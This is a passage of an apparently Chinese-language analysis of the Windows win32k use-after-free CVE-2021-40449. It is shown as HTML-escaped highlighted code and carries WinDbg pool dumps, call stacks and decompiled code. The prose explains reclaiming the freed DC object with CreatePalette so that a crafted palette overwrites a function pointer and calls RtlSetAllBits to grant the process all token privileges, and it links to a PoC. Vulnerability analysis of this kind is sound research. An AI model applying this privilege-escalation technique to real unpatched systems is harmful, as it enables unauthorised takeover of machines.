&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b030
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b030 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b040 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063030&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b050 &lt;span style="color:#ae81ff">00000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000001&lt;/span> ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b030
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b060 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">0000&lt;/span>&lt;span style="color:#ae81ff">8180&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b070 ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a317b8b0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b080 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b090 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b0a0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在DeleteDCInternel调用之后第一个DC对象的内存空间已经被释放&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>pool ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063030&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 注意，此时DC对象地址距离堆头地址为0x30大小
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>Pool page ffff885e80063030 region is Paged session pool
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">*&lt;/span>ffff885e80063000 size: e30 previous size: &lt;span style="color:#ae81ff">0&lt;/span> (Free ) &lt;span style="color:#f92672">*&lt;/span>GDev
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Pooltag GDev : Gdi pdev
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ffff885e80063e30 size: &lt;span style="color:#ae81ff">70&lt;/span> previous size: &lt;span style="color:#a6e22e">e30&lt;/span> (Free) Free
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ffff885e80063ea0 size: b0 previous size: &lt;span style="color:#ae81ff">70&lt;/span> (Free ) Usqm
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ffff885e80063f50 size: b0 previous size: &lt;span style="color:#a6e22e">b0&lt;/span> (Allocated) Usqm
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>根据调试，可以得知释放的DC对象内存大小为0xe30，所以要覆盖函数指针时，所申请的内存也要刚刚好或者接近这块内存大小才有可能申请到。在poc里面，使用CreatePalette申请这块内核堆。这个函数会通过系统调用进入内核函数win32kfull!NtGdiCreatePaletteInternal，该函数调用win32kbase!PALMEMOBJ::bCreatePalette创造Palette对象，win32kbase!PALMEMOBJ::bCreatePalette会调用AllocateObject为新对象申请空间，最终通过调用ExAllocatePoolWithTag函数分配堆空间，整个调用栈如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> kb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># RetAddr : Call Site
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span> ffff880c&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b95d39f4 : win32kbase&lt;span style="color:#f92672">!&lt;/span>Win32AllocPool
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">01&lt;/span> ffff880c&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b95d0042 : win32kbase&lt;span style="color:#f92672">!&lt;/span>AllocateObject&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xc4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">02&lt;/span> ffff880c&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b9309ecc : win32kbase&lt;span style="color:#f92672">!&lt;/span>PALMEMOBJ&lt;span style="color:#f92672">::&lt;/span>bCreatePalette&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xb2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">03&lt;/span> fffff800&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b175a193 : win32kfull&lt;span style="color:#f92672">!&lt;/span>NtGdiCreatePaletteInternal&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xcc&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">04&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a2cb2604 : nt&lt;span style="color:#f92672">!&lt;/span>KiSystemServiceCopyEnd&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x13&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">05&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>e44c2fe1 : win32u&lt;span style="color:#f92672">!&lt;/span>NtGdiCreatePaletteInternal&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x14&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">06&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000&lt;/span>d94 : cve_2021_40449&lt;span style="color:#f92672">!&lt;/span>createPaletteofSize1&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xd1&lt;/span> [C:&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>Users&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>mimi&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>source&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>repos&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>test&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>cve&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2021&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">40449&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>main.cpp &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">71&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2&lt;/span>e &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a2e9b26f : &lt;span style="color:#ae81ff">0x000000d1&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a374ef69
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2f&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a39e1a4a : gdi32full&lt;span style="color:#f92672">!&lt;/span>GdiPrinterThunk&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x21f&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">30&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a61889e4 : USER32&lt;span style="color:#f92672">!&lt;/span>__ClientPrinterThunk&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x3a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">31&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a2cb6dc4 : ntdll&lt;span style="color:#f92672">!&lt;/span>KiUserCallbackDispatcherContinue
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a2e7edda : win32u&lt;span style="color:#f92672">!&lt;/span>NtGdiResetDC&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x14&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">33&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3682371 : gdi32full&lt;span style="color:#f92672">!&lt;/span>ResetDCWInternal&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x17a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">34&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>e44c3296 : GDI32&lt;span style="color:#f92672">!&lt;/span>ResetDCW&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x31&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">35&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#f92672">:&lt;/span> cve_2021_40449&lt;span style="color:#f92672">!&lt;/span>main&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x146&lt;/span> [C:&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>Users&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>mimi&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>source&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>repos&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>test&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>cve&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2021&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">40449&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>main.cpp &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">685&lt;/span>]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>win32kbase!Win32AllocPool代码如下，最终是通过调用&lt;code>ExAllocatePoolWithTag&lt;/code>申请堆，win32kbase!Win32AllocPool的a1参数为要申请的堆内存大小，调试过程中可以得知其要申请0xe20大小的堆，加上堆头，刚好接近刚释放的0xe3大小的堆空间大小。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">Win32AllocPool&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> a2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v2; &lt;span style="color:#75715e">// ebx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v3; &lt;span style="color:#75715e">// rdi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> result; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> a2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3 &lt;span style="color:#f92672">=&lt;/span> a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">signed&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#a6e22e">IsWin32AllocPoolImplSupported_0&lt;/span>() &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Win32AllocPoolImpl_0&lt;/span>(&lt;span style="color:#ae81ff">33&lt;/span>i64, v3, v2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="image-20211111140552152" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211111140552152.png" />&lt;/p>
&lt;p>同时在Poc代码分析里面分析了DC对象函数指针和堆头之间的位置关系，所以通过构造传入CreatePalette的LOGPALETTE结构可以刚刚好覆盖原DC对象内的函数指针以及该函数指针要调用的参数，内存分布具体见https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp 里面的注释。&lt;/p>
&lt;p>
&lt;img alt="image-20211112195951766" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211112195951766.png" />&lt;/p>
&lt;p>通过函数指针调用RtlSetAllBits函数并传入RtklBitMap型指针，其中RtlBitMap的buffer指向POC进程自身的权限位，如下图：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> _RTL_BITMAP {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG SizeOfBitMap;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG &lt;span style="color:#f92672">*&lt;/span>Buffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} RTL_BITMAP, &lt;span style="color:#f92672">*&lt;/span>PRTL_BITMAP;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="image-20211112200708126" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211112200708126.png" />&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffff885e80063000&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x750&lt;/span> &lt;span style="color:#75715e">// 此处为RtlBitMap地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063750&lt;/span> ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839010 ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063760&lt;/span> ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063770&lt;/span> ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063780&lt;/span> ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063790&lt;/span> ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">800637&lt;/span>a0 ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">800637&lt;/span>b0 ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">800637&lt;/span>c0 ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839010 &lt;span style="color:#75715e">// 此处存放了RtlBitMap结构，0x00-0x08为size，0x08-0x10为buffer指针，指向了自身的权限位
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839010 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">000000&lt;/span>&lt;span style="color:#ae81ff">80&lt;/span> ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2e9d0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839020 &lt;span style="color:#ae81ff">41414141&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">41414141&lt;/span> &lt;span style="color:#ae81ff">41414141&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">41414141&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839030 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839040 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839050 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839060 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839070 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839080 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2e9d0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2e9d0 &lt;span style="color:#ae81ff">00000006&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">02&lt;/span>&lt;span style="color:#ae81ff">880000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>&lt;span style="color:#ae81ff">800000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2e9e0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>&lt;span style="color:#ae81ff">800000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
